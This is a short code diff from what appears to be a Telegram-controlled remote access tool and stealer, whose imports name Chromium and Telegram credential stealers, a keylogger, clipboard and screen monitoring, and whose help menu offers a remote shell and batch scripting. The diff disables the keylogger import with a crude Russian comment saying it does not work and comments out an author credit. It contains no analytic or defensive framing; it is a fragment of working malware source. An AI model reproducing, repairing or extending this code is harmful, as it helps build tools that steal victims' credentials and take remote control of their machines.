@@ -33,7 +33,7 @@ from Core.Stealer.Chromium         import *
 from Core.Stealer.Telegram         import *
 
 from Core.Other.Clipboard          import *
-from Core.Other.Keylogger          import *
+#from Core.Other.Keylogger          import * <-- эта хуйня не работает
 from Core.Other.SendKeys           import *
 from Core.Other.Monitor            import *
 from Core.Other.Volume             import *
@@ -1378,8 +1378,8 @@ def Help(command):
 		'\n*/CMD* - _Remote Shell_'
 		'\n*/BAT* - _Batch Scripting_'
 		'\n'
-		'\n'
-		'\n*Coded by Bainky | @bainki 👾*', 
+		'\n',
+		#'\n*Coded by Bainky | @bainki 👾*', 
 			reply_markup=menu, parse_mode='Markdown')
 
 
